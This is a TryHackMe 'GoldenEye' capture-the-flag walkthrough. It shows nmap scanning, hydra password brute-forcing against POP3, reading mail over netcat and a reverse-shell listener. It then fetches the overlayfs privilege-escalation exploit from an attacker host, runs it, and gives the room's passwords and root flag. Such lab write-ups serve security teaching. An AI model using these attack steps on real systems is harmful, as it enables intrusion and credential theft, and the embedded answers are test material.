---
description: https://tryhackme.com/room/goldeneye
---

# GoldenEye

## Task 1 Intro & Enumeration

#### First things first, connect to our network and deploy the machine.

#### Use nmap to scan the network for all ports. How many ports are open?

```bash
nmap -n -p- -T4 10.10.153.2
```

![nmap -n -p- -T4 10.10.153.2](<../../.gitbook/assets/Screenshot from 2022-02-21 16-40-46.png>)

{% hint style="success" %}
`4`
{% endhint %}

#### Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

![http://10.10.153.2/](<../../.gitbook/assets/Screenshot from 2022-02-21 16-44-10.png>)

![view-source:http://10.10.153.2/terminal.js](<../../.gitbook/assets/Screenshot from 2022-02-21 16-44-12.png>)

#### Who needs to make sure they update their default password?

{% hint style="success" %}
`Boris`
{% endhint %}

#### Whats their password?

![](<../../.gitbook/assets/Screenshot from 2022-02-21 19-25-25.png>)

{% hint style="success" %}
`InvincibleHack3r`
{% endhint %}

#### Now go use those credentials and login to a part of the site.

![http://10.10.153.2/sev-home/](<../../.gitbook/assets/Screenshot from 2022-02-21 17-01-41.png>)

## Task 2 It's mail time

#### Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?

```bash
namp -n -sV -p25,80,55006,55007 10.10.153.2
hydra -l boris -p InvincibleHack3r smtp://10.10.153.2
hydra -l boris -p InvincibleHack3r pop3s://10.10.153.2:55006
hydra -l boris -p InvincibleHack3r pop3://10.10.153.2:55007
```

![namp -n -sV -p25,80,55006,55007 10.10.153.2](<../../.gitbook/assets/Screenshot from 2022-02-21 17-13-53.png>)

![hydra -l boris -p InvincibleHack3r smtp://10.10.153.2](<../../.gitbook/assets/Screenshot from 2022-02-21 17-18-07.png>)

![hydra -l boris -p InvincibleHack3r pop3s://10.10.153.2:55006](<../../.gitbook/assets/Screenshot from 2022-02-21 17-19-22.png>)

![hydra -l boris -p InvincibleHack3r pop3://10.10.153.2:55007](<../../.gitbook/assets/Screenshot from 2022-02-21 17-19-39.png>)

#### <mark style="color:red;">If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra? Whats their new password?</mark>

```bash
hydra -l natalya -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      -t 64 -I -V pop3://10.10.153.2:55007
hydra -l boris -P /usr/share/set/src/fasttrack/wordlist.txt \                                                                                       130 ⨯
      -t 64 -I -V pop3://10.10.110.132:55007
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 19-23-23.png>)

![](<../../.gitbook/assets/Screenshot from 2022-02-21 23-12-06.png>)

{% hint style="success" %}
`secret1!`
{% endhint %}

#### <mark style="color:red;">Inspect port 55007, what services is configured to use this port?</mark>

{% hint style="success" %}
`telnet`
{% endhint %}

#### Login using that service and the credentials you found earlier.

```bash
nc 10.10.161.10 55007
USER natalya
PASS bird
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 19-39-21.png>)

#### What can you find on this service?

```bash
LIST
RETR 1
RETR 2
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 19-46-38.png>)

![](<../../.gitbook/assets/Screenshot from 2022-02-21 19-39-24.png>)

{% hint style="success" %}
`emails`
{% endhint %}

#### What user can break Boris' codes?

{% hint style="success" %}
`natalya`
{% endhint %}

#### Using the users you found on this service, find other users passwords

#### Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.

## Task 3 GoldenEye Operators Training

#### If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.

#### If you're on Linux edit your "/etc/hosts" file and add:

#### If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file

```bash
echo '10.10.161.10 severnaya-station.com' | sudo tee -a /etc/hosts
```

#### Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir

#### Try using the credentials you found earlier. Which user can you login as?

![http://severnaya-station.com/gnocertdir/](<../../.gitbook/assets/Screenshot from 2022-02-21 19-54-42 (1).png>)

{% hint style="success" %}
`xenia`
{% endhint %}

#### Have a poke around the site. What other user can you find?

{% hint style="success" %}
`Doak`
{% endhint %}

#### What was this users password?

```bash
hydra -l doak -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      -t 64 -I -V pop3://10.10.161.10:55007
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 20-24-13.png>)

{% hint style="success" %}
`goat`
{% endhint %}

#### Use this users credentials to go through all the services you have found to reveal more emails.

```bash
nc 10.10.161.10 55007
USER doak
PASS goat
LIST
RETR 1
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 20-27-11.png>)

#### What is the next user you can find from doak?

{% hint style="success" %}
`dr_doak`
{% endhint %}

#### What is this users password?

{% hint style="success" %}
`4England!`
{% endhint %}

#### Take a look at their files on the moodle (severnaya-station.com)

![](<../../.gitbook/assets/Screenshot from 2022-02-21 20-35-04.png>)

```
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```

#### Download the attachments and see if there are any hidden messages inside them?

```bash
wget http://severnaya-station.com/dir007key/for-007.jpg
file for-007.jpg
echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d 
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 20-47-49.png>)

#### Using the information you found in the last task, login with the newly found user.

![](<../../.gitbook/assets/Screenshot from 2022-02-21 20-49-30.png>)

#### <mark style="color:red;">As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.</mark>

#### <mark style="color:red;">Take a look into Aspell, the spell checker plugin.</mark>

```bash
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 22-04-40.png>)

![](<../../.gitbook/assets/Screenshot from 2022-02-21 22-07-27.png>)

![](<../../.gitbook/assets/Screenshot from 2022-02-21 22-03-58.png>)

## Task 4 Privilege Escalation

#### Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.

```bash
wget http://10.6.9.176/linuxprivchecker.py
python linuxprivchecker.py
```

#### Whats the kernel version?

```bash
uname -a
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 22-11-30.png>)

{% hint style="success" %}
`3.13.0-32-generic`
{% endhint %}

#### This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

* **Create new user and mount namespace using clone with CLONE\_NEWUSER|CLONE\_NEWNS flags.**
* **Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.**
* **Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.**
* **Make su on overlayfs world writable without changing the owner**
* **Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.**
* **Execute the modified su binary**

#### You can download the exploit from here: [https://www.exploit-db.com/exploits/37292](https://www.exploit-db.com/exploits/37292)

#### Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!

```bash
searchsploit -m 37292 
sed -i 's/gcc/cc/g' 37292.c
sudo mv 37292.c /var/www/html/ofs.c
```

#### What development tools are installed on the machine?

![](<../../.gitbook/assets/Screenshot from 2022-02-21 22-19-34.png>)

#### What is the root flag?

```bash
wget http://10.6.9.176/ofs.c
cc ofs.c -o ofs
./ofs
ls -a /root
cat /root/.flag.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-02-21 22-40-35.png>)

{% hint style="success" %}
`568628e0d993b1973adc718237da6e93`
{% endhint %}

## Reference

{% embed url="https://www.shellhacks.com/retrieve-email-pop3-server-command-line" %}

{% embed url="https://www.exploit-db.com/exploits/37292" %}
